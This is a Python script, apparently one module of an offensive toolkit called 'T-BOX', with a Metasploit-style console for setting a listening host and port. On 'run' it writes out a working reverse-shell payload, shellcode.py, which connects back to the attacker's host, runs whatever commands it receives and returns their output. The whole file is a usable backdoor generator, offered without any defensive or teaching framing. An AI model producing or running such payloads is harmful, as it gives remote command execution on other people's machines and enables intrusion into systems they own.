import os
lport = '6666'
def summon_python(lhost,lport):
    f = open('shellcode.txt','w')
    f.write('import socket \n')
    f.write('import subprocess \n')
    f.write('sock=socket.socket() \n')
    f.write("sock.connect(('")
    f.write(lhost)
    f.write("',")
    f.write(str(lport))
    f.write(")) \n")
    f.write('while True: \n')
    f.write('    data = sock.recv(1024) \n')
    f.write("    da = data.decode('utf-8') \n")
    f.write("    fankui = subprocess.getoutput(da) \n")
    f.write("    sock.sendall(fankui.encode('utf-8')) \n")
    f.close()
    os.rename('shellcode.txt','shellcode.py')
    print('[*]生成完毕 R > shellcode.py')

lhost = '0.0.0.0'
while True:
    cmd = input('T-BOX auxiliary(summon/pythonn) >')

    if cmd == 'show options':
        print('                                                          ')
        print('----------name---------content------------present---------')
        print('        lhost     ' + lhost + '               本机IP   ')
        print('        lport     '+ lport + '             端口      ')
        print('                                                          ')

    elif cmd[:10] == 'set lhost ':
        lhost = cmd[10:]
        print('[*]lhost ==> '+lhost)
    
    elif cmd[:10] == 'set lport ':
        lport = cmd[10:]
        print('[*]lport ==> '+lport)
    
    
    elif cmd == 'run':
        if lhost == '0.0.0.0':
            print('[-]请设置本机IP')
        else:
            summon_python(lhost=lhost,lport=lport)

    elif cmd == '':    
        pass

    elif cmd == 'back':
        break
        
    else:
        print("[-]can't find command: " + cmd)